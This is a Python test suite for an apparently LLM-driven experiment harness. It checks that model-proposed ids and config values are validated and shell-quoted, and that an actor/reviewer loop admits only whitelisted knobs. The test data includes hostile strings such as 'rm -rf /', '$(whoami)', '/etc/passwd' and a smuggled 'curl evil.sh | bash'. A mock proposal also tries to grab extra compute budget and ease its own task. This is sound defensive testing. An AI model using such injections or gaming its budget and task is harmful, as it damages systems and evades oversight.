"""Tests for the authorization layer: nothing a model says can reach a command line unvalidated.

These cover the rules from implementations.md that must hold before any unattended session (§2.1
models advise / code authorizes, §3.3 knob whitelist, §3.4 slug discipline, §7.4 execution safety),
plus the ladder's fidelity hygiene. Run: `python -m pytest tests -q` from the RLLM root.
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from rllm import ladder, validate
from rllm.interfaces import ExperimentSpec, Fidelity, KnobSpec, ProblemAdapter, RunResult
from rllm.llm import controller
from rllm.llm.backend import CLIBackend, MockBackend, parse_json
from rllm.registry import Registry
from adapters.rx.adapter import RxAdapter, _sh

ADAPTER = RxAdapter()


def spec(exp_id="probe", config=None, hypothesis="a hypothesis"):
    return ExperimentSpec(id=exp_id, hypothesis=hypothesis, config=dict(config or {}))


# ---------------------------------------------------------------- slugs / ids

@pytest.mark.parametrize("bad", [
    "evil; rm -rf /", "../../etc/passwd", "a b", "UPPER", "9lead", "with'quote", "$(whoami)",
    "x" * 65, "", None, 7,
])
def test_bad_ids_rejected(bad):
    assert validate.check_id(bad), f"{bad!r} should be rejected"


@pytest.mark.parametrize("good", ["m1", "m1_bootstrap", "n-step-3", "a" * 64])
def test_good_slugs_accepted(good):
    assert validate.check_slug(good) == []


def test_promoted_id_form_is_accepted_but_not_a_valid_proposal_slug():
    assert validate.check_id("m1_bootstrap@refine") == []
    assert validate.check_slug("m1_bootstrap@refine")   # an actor may not propose that form


# ---------------------------------------------------------------- knob whitelist

def test_unknown_knob_rejected():
    errs = validate.validate_spec(ADAPTER, spec(config={"NOT_A_KNOB": 1}))
    assert any("unknown knob" in e for e in errs)


def test_out_of_range_rejected():
    assert any("above maximum" in e for e in validate.validate_spec(ADAPTER, spec(config={"GAMMA": 5.0})))
    assert any("below minimum" in e for e in validate.validate_spec(ADAPTER, spec(config={"LR": 0.0})))


def test_wrong_type_rejected():
    assert validate.validate_spec(ADAPTER, spec(config={"TD_N_STEPS": 2.5}))       # int knob
    assert validate.validate_spec(ADAPTER, spec(config={"GAMMA": "0.99"}))         # float knob, string
    assert validate.validate_spec(ADAPTER, spec(config={"BATCH": True}))           # bool is not an int
    assert validate.validate_spec(ADAPTER, spec(config={"SCALE_MODE": 3}))         # enum knob, number
    assert validate.validate_spec(ADAPTER, spec(config={"HIDDEN_SIZES": [256, 256]}))  # no containers


def test_enum_choice_enforced_blocks_value_injection():
    errs = validate.validate_spec(ADAPTER, spec(config={"SCALE_MODE": "fixed; curl evil.sh | bash"}))
    assert any("not in choices" in e for e in errs)


def test_task_definition_knob_needs_explicit_permission():
    cfg = {"RFID_PROB": 0.9}
    assert any("task_definition" in e for e in validate.validate_spec(ADAPTER, spec(config=cfg)))
    assert validate.validate_spec(ADAPTER, spec(config=cfg),
                                  permitted_task_changes=("RFID_PROB",)) == []


def test_budget_and_plumbing_knobs_are_harness_only():
    for knob, value in [("MAXGEN", 5000), ("EVAL_EVERY", 1), ("BC_EPOCHS", 0), ("SEED", 5),
                        ("DEMOS", "x.npz"), ("DR_CONFIG", "/etc/passwd")]:
        errs = validate.validate_spec(ADAPTER, spec(config={knob: value}))
        assert errs, f"{knob} must not be model-settable"
    # ...but the harness itself may set them.
    assert validate.validate_config(ADAPTER, {"MAXGEN": 500}, llm_proposed=False) == []


def test_hypothesis_required():
    assert any("hypothesis" in e for e in validate.validate_spec(ADAPTER, spec(hypothesis="  ")))


def test_valid_proposal_passes():
    assert validate.validate_spec(ADAPTER, spec("n_step_3", {"TD_N_STEPS": 3, "GAMMA": 0.995})) == []


def test_adapter_self_check_clean():
    assert validate.validate_adapter(ADAPTER) == []


def test_adapter_with_undeclared_knobs_rejects_everything():
    class Bare(ProblemAdapter):
        name = "bare"; success_metric = "m"; success_goal = "g"
        def fidelity_levels(self): return [Fidelity("screen", {}, [1])]
        def build_command(self, s, seed, run_dir, device): return ["true"]
        def parse_result(self, run_dir): return {}
        def is_solved(self, metrics): return False
    assert validate.validate_config(Bare(), {"ANY": 1})


def test_knob_table_hides_gated_knobs():
    table = validate.knob_table(ADAPTER)
    assert "TD_N_STEPS" in table
    for gated in ("MAXGEN", "RFID_PROB", "DR_CONFIG", "SEED"):
        assert gated not in table


# ---------------------------------------------------------------- enqueue gate

def test_enqueue_is_all_or_nothing(tmp_path):
    good, bad = spec("good_one", {"TD_N_STEPS": 2}), spec("bad_one", {"NOT_A_KNOB": 1})
    with pytest.raises(ValueError):
        ladder.enqueue_experiments(ADAPTER, tmp_path, [good, bad], "screen")
    assert Registry(tmp_path).all_specs() == []


def test_enqueue_valid_wave(tmp_path):
    n = ladder.enqueue_experiments(ADAPTER, tmp_path, [spec("good_one", {"TD_N_STEPS": 2})], "screen")
    assert n == 1                                        # screen runs one seed
    stored = Registry(tmp_path).get_spec("good_one")
    assert stored.config["MAXGEN"] == 60                 # rung overrides merged in
    assert stored.config["TD_N_STEPS"] == 2


# ---------------------------------------------------------------- duplicate work

def test_duplicate_id_is_rejected(tmp_path):
    existing = [spec("cand", {"TD_N_STEPS": 2})]
    errs = validate.validate_spec(ADAPTER, spec("cand", {"GAMMA": 0.995}), existing=existing)
    assert any("duplicate" in e for e in errs)


def test_same_config_under_a_new_name_is_rejected(tmp_path):
    """Paying twice for one answer is waste whatever the experiment is called."""
    existing = [spec("first", {"TD_N_STEPS": 3})]
    errs = validate.validate_spec(ADAPTER, spec("second", {"TD_N_STEPS": 3}), existing=existing)
    assert any("duplicate of already-registered experiment 'first'" in e for e in errs)


def test_restating_a_base_value_counts_as_the_base_config(tmp_path):
    """`TRUNC: 1` is already the Rx base, so an experiment that only sets it is the base again."""
    base_only = spec("explicit_base", {"TRUNC": 1})
    plain_base = spec("implicit_base", {})
    assert (validate.config_fingerprint(ADAPTER, base_only.config)
            == validate.config_fingerprint(ADAPTER, plain_base.config))


def test_fidelity_overrides_do_not_affect_the_fingerprint(tmp_path):
    """The same idea at two rungs is the same idea — rung knobs are excluded from the hash."""
    a = validate.config_fingerprint(ADAPTER, {"TD_N_STEPS": 3})
    b = validate.config_fingerprint(ADAPTER, {"TD_N_STEPS": 3, "MAXGEN": 60, "BC_EPOCHS": 0})
    assert a == b


def test_genuinely_different_configs_are_not_duplicates(tmp_path):
    existing = [spec("first", {"TD_N_STEPS": 3})]
    assert validate.validate_spec(ADAPTER, spec("second", {"TD_N_STEPS": 4}), existing=existing) == []


def test_controller_rejects_duplicates_within_one_batch(tmp_path):
    batch = {"experiments": [
        {"id": "one", "hypothesis": "n-step 3", "config": {"TD_N_STEPS": 3}},
        {"id": "two", "hypothesis": "n-step 3 again, renamed", "config": {"TD_N_STEPS": 3}},
    ]}
    res, log = _run(tmp_path, {"verdict": "approve", "approved_item_ids": ["one", "two"]},
                    proposals=[batch])
    assert res["ids"] == ["one"]
    assert any("duplicate" in r for r in log[0]["validation_rejected"])


# ---------------------------------------------------------------- fidelity hygiene

def test_promote_drops_cheap_rung_overrides(tmp_path):
    ladder.enqueue_experiments(ADAPTER, tmp_path, [spec("cand", {"TD_N_STEPS": 2})], "screen")
    reg = Registry(tmp_path)
    reg.put_result(RunResult("cand", 1, "screen", str(tmp_path / "r"), "done",
                             {"success_fraction": 0.5, "mean_shortage_days": 1.0}))
    assert ladder.promote(ADAPTER, tmp_path, "screen", "refine", 1) == ["cand@refine"]
    cfg = reg.get_spec("cand@refine").config
    assert cfg["MAXGEN"] == 250                          # refine's budget, not screen's 60
    # screen set BC_EPOCHS=0 to be cheap; refine doesn't set it, so it must be GONE (the runner's own
    # default applies) rather than silently inheriting the cheap rung's value.
    assert "BC_EPOCHS" not in cfg
    assert cfg["TD_N_STEPS"] == 2                        # the experiment's own knob survives


def test_promoting_twice_does_not_stack_suffixes(tmp_path):
    ladder.enqueue_experiments(ADAPTER, tmp_path, [spec("cand", {"TD_N_STEPS": 2})], "screen")
    reg = Registry(tmp_path)
    reg.put_result(RunResult("cand", 1, "screen", str(tmp_path / "r"), "done",
                             {"success_fraction": 0.5, "mean_shortage_days": 1.0}))
    ladder.promote(ADAPTER, tmp_path, "screen", "refine", 1)
    reg.put_result(RunResult("cand@refine", 1, "refine", str(tmp_path / "r"), "done",
                             {"success_fraction": 0.6, "mean_shortage_days": 0.9}))
    assert ladder.promote(ADAPTER, tmp_path, "refine", "confirm", 1) == ["cand@confirm"]


# ---------------------------------------------------------------- command construction

def test_build_command_only_emits_reviewed_knobs(tmp_path):
    cmd = ADAPTER.build_command(spec("cand", {"TD_N_STEPS": 3}), seed=1, run_dir=str(tmp_path / "x"),
                                device="0")
    assert cmd[:2] == ["bash", "-c"]
    assert "TD_N_STEPS=3" in cmd[2] and "PREFIX=rllm_x" in cmd[2]


def test_sh_quoting_refuses_shell_metacharacters():
    assert _sh("available_fraction") == "available_fraction"
    assert _sh("256 256") == "'256 256'"
    for hostile in ["a; rm -rf /", "a'b", "$(id)", "`id`", "a|b", "a\nb", "a&b"]:
        with pytest.raises(ValueError):
            _sh(hostile)


# ---------------------------------------------------------------- dry run consumes nothing

def test_dry_run_renders_commands_without_consuming_jobs(tmp_path):
    """§12: a dry run validates and renders commands but must never move jobs to done/ or record a
    result — a fake result would otherwise be indistinguishable from evidence when ranking."""
    from rllm.dispatcher import Queue, worker
    ladder.enqueue_experiments(ADAPTER, tmp_path, [spec("cand_a", {"TD_N_STEPS": 2}),
                                                   spec("cand_b", {"GAMMA": 0.995})], "screen")
    q = Queue(tmp_path)
    assert q.pending_count() == 2
    worker(ADAPTER, tmp_path, device="0", dry_run=True)
    assert q.pending_count() == 2                                  # still claimable
    assert Registry(tmp_path).all_results() == []                  # no evidence invented
    assert not list((Path(tmp_path) / "queue" / "done").glob("*.json"))
    rendered = sorted(p.read_text() for p in (Path(tmp_path) / "runs").glob("*/DRYRUN_CMD.txt"))
    assert len(rendered) == 2 and all("run_tqc_deep.sh" in r for r in rendered)


def test_dry_run_terminates_on_a_full_queue_circuit(tmp_path):
    """Releasing jobs back to pending/ must not spin forever."""
    from rllm.dispatcher import worker
    ladder.enqueue_experiments(ADAPTER, tmp_path, [spec("cand_a", {"TD_N_STEPS": 2})], "screen")
    worker(ADAPTER, tmp_path, device="0", dry_run=True, poll_seconds=0.0)   # returns == passes


# ---------------------------------------------------------------- controller loop

HOSTILE_PROPOSAL = {"experiments": [
    {"id": "evil; rm -rf /", "hypothesis": "shell injection via id", "config": {}},
    {"id": "unknown_knob", "hypothesis": "pass-through knob", "config": {"NOT_A_KNOB": 1}},
    {"id": "steal_budget", "hypothesis": "buy more compute", "config": {"MAXGEN": 5000}},
    {"id": "change_task", "hypothesis": "make the problem easier", "config": {"RFID_PROB": 0.9}},
    {"id": "n_step_3", "hypothesis": "n-step returns propagate the delayed signal", "config": {"TD_N_STEPS": 3}},
]}


def _run(tmp_path, verdict, proposals=None, max_revisions=0):
    actor = MockBackend([json.dumps(p) for p in (proposals or [HOSTILE_PROPOSAL])])
    reviewer = MockBackend([json.dumps(verdict)] * 4)
    res = controller.propose_and_review(actor, reviewer, ADAPTER, tmp_path, n=5,
                                        max_revisions=max_revisions)
    log = [json.loads(l) for l in (Path(tmp_path) / "decisions.jsonl").read_text().splitlines()]
    return res, log


def test_only_valid_experiments_survive_an_approve(tmp_path):
    res, log = _run(tmp_path, {"verdict": "approve", "approved_item_ids": ["n_step_3", "steal_budget"]})
    assert res["action"] == "enqueued" and res["ids"] == ["n_step_3"]
    assert len(log[0]["validation_rejected"]) == 4


def test_approval_never_defaults_to_everything(tmp_path):
    """§7.2: an absent or empty approved list approves nothing — never the whole batch."""
    for verdict in ({"verdict": "approve"}, {"verdict": "approve", "approved_item_ids": []},
                    {"verdict": "approve", "approved_item_ids": None}):
        res, _ = _run(tmp_path, verdict)
        assert res["ids"] == [], verdict


def test_reviewer_cannot_admit_what_validation_rejected(tmp_path):
    res, _ = _run(tmp_path, {"verdict": "approve",
                             "approved_item_ids": ["change_task", "evil; rm -rf /", "n_step_3"]})
    assert res["ids"] == ["n_step_3"]


def test_reviewer_approval_can_only_narrow(tmp_path):
    res, _ = _run(tmp_path, {"verdict": "approve", "approved_item_ids": ["something_else_entirely"]})
    assert res["action"] == "enqueued" and res["ids"] == []


def test_keep_ids_accepted_as_alias(tmp_path):
    res, _ = _run(tmp_path, {"verdict": "approve", "keep_ids": ["n_step_3"]})
    assert res["ids"] == ["n_step_3"]


def test_required_changes_are_fed_back(tmp_path):
    actor = MockBackend([json.dumps(HOSTILE_PROPOSAL), json.dumps(HOSTILE_PROPOSAL)])
    reviewer = MockBackend([json.dumps({"verdict": "revise", "required_changes": ["drop the MAXGEN knob"],
                                        "risk_flags": ["insufficient_seeds"]}),
                            json.dumps({"verdict": "approve", "approved_item_ids": ["n_step_3"]})])
    res = controller.propose_and_review(actor, reviewer, ADAPTER, tmp_path, n=5, max_revisions=1)
    assert "drop the MAXGEN knob" in actor.calls[1][1]
    assert res["ids"] == ["n_step_3"]


def test_both_prompts_state_the_base_recipe(tmp_path):
    """First live run: all four proposals re-stated TRUNC=1 (already the base) and one duplicated the
    base outright, because neither model was shown the base recipe."""
    actor = MockBackend([json.dumps(HOSTILE_PROPOSAL)])
    reviewer = MockBackend([json.dumps({"verdict": "block"})])
    controller.propose_and_review(actor, reviewer, ADAPTER, tmp_path, n=5, max_revisions=0)
    for _, prompt in (actor.calls + reviewer.calls):
        assert "SELECT_METRIC = 'shortage_days'" in prompt and "TRUNC = 1" in prompt


def test_both_prompts_state_the_harness_owned_ladder(tmp_path):
    """The first live run deadlocked on the reviewer demanding budget/seeds the actor cannot set."""
    actor = MockBackend([json.dumps(HOSTILE_PROPOSAL)])
    reviewer = MockBackend([json.dumps({"verdict": "block"})])
    controller.propose_and_review(actor, reviewer, ADAPTER, tmp_path, n=5, max_revisions=0)
    for _, prompt in (actor.calls + reviewer.calls):
        assert "seed(s)" in prompt and "not proposable" in prompt


def test_block_enqueues_nothing(tmp_path):
    res, _ = _run(tmp_path, {"verdict": "block", "reasons": ["all duplicates"]})
    assert res["action"] == "blocked"
    assert Registry(tmp_path).all_specs() == []


def test_revision_loop_is_bounded_and_logged(tmp_path):
    res, log = _run(tmp_path, {"verdict": "revise", "reasons": ["too vague"]},
                    proposals=[HOSTILE_PROPOSAL, HOSTILE_PROPOSAL, HOSTILE_PROPOSAL], max_revisions=1)
    assert res["action"] == "blocked"
    assert sum(1 for r in log if r["stage"] == "propose") == 2      # initial + one revision, no more


def test_validation_reasons_are_fed_back_to_the_actor(tmp_path):
    actor = MockBackend([json.dumps(HOSTILE_PROPOSAL), json.dumps(HOSTILE_PROPOSAL)])
    reviewer = MockBackend([json.dumps({"verdict": "revise", "reasons": ["fix the ids"]}),
                            json.dumps({"verdict": "approve"})])
    controller.propose_and_review(actor, reviewer, ADAPTER, tmp_path, n=5, max_revisions=1)
    second_prompt = actor.calls[1][1]
    assert "revise" in second_prompt.lower() and "unknown knob" in second_prompt


def test_decision_log_records_backend_identity(tmp_path):
    _, log = _run(tmp_path, {"verdict": "approve"})
    assert log[0]["actor"] == "mock" and log[0]["reviewer"] == "mock"


def test_actor_prompt_shows_previous_configs_not_just_scores(tmp_path):
    """Without the knob values behind each score the actor cannot search around a good result."""
    from rllm.interfaces import RunResult
    ladder.enqueue_experiments(ADAPTER, tmp_path, [spec("earlier", {"TD_N_STEPS": 3})], "screen")
    Registry(tmp_path).put_result(RunResult("earlier", 1, "screen", str(tmp_path), "done",
                                            {"success_fraction": 0.42, "mean_shortage_days": 1.1}, 60.0))
    actor = MockBackend([json.dumps(HOSTILE_PROPOSAL)])
    controller.propose_and_review(actor, MockBackend([json.dumps({"verdict": "block"})]),
                                  ADAPTER, tmp_path, n=5, max_revisions=0)
    prompt = actor.calls[0][1]
    assert '"TD_N_STEPS": 3' in prompt          # the config, not only the name
    assert "success_fraction=0.42" in prompt    # ...and its measured result
    assert "MAXGEN" not in prompt.split("[screen]", 1)[1].split("already-registered", 1)[0]


def test_actor_prompt_carries_memory_and_knob_table(tmp_path):
    (Path(tmp_path) / "problem.md").write_text("n_days stays 100 (realism)")
    actor = MockBackend([json.dumps(HOSTILE_PROPOSAL)])
    controller.propose_and_review(actor, MockBackend([json.dumps({"verdict": "block"})]),
                                  ADAPTER, tmp_path, n=5, max_revisions=0)
    prompt = actor.calls[0][1]
    assert "realism" in prompt                       # problem.md memory is present
    assert "TD_N_STEPS" in prompt                    # ...and the proposable knob table
    # MAXGEN appears only as harness-owned ladder context, never in the proposable knob table.
    assert "MAXGEN" not in prompt.split("## Knobs you may set", 1)[1].split("## Task", 1)[0]


# ---------------------------------------------------------------- backends

def test_parse_json_tolerates_prose_and_fences():
    assert parse_json('```json\n{"a": {"b": 1}}\n```') == {"a": {"b": 1}}
    assert parse_json('Sure!\n{"a": 1}\nHope that helps.') == {"a": 1}
    with pytest.raises(ValueError):
        parse_json("no object here")


def test_cli_backend_sends_prompt_on_stdin_not_argv():
    """§7.4: large prompts go via stdin; `cat` echoes exactly what the CLI would have received."""
    b = CLIBackend("fake", ["cat"], text_from="raw", stdin_prompt=True)
    assert b.ask("SYS", "USER") == "[SYSTEM INSTRUCTIONS]\nSYS\n\n[TASK]\nUSER"


def test_cli_backend_reads_last_message_file_and_cleans_up(tmp_path):
    b = CLIBackend("fake", ["sh", "-c", 'cat > "$1"', "sh", "{outfile}"], text_from="file",
                   stdin_prompt=True)
    assert b.ask("", '{"ok": true}') == '{"ok": true}'
    assert not list(Path("/tmp").glob("rllm_llm_*.txt"))


def test_cli_backend_system_flag_is_substituted_not_folded():
    b = CLIBackend("fake", ["sh", "-c", 'printf %s "$1"', "sh", "{system}"], text_from="raw",
                   stdin_prompt=True)
    assert b.ask("SYS", "USER") == "SYS"


def test_cli_backend_raises_on_failure():
    b = CLIBackend("fake", ["sh", "-c", "echo boom >&2; exit 3"], text_from="raw")
    with pytest.raises(RuntimeError, match="boom"):
        b.ask("", "x")


def test_presets_are_read_only_and_toolless():
    assert "--tools" in CLIBackend.CLAUDE and CLIBackend.CLAUDE[CLIBackend.CLAUDE.index("--tools") + 1] == ""
    for flag in ("--sandbox", "read-only", "--ephemeral"):
        assert flag in CLIBackend.CODEX
    for preset in (CLIBackend.claude(), CLIBackend.codex()):
        assert preset.stdin_prompt is True
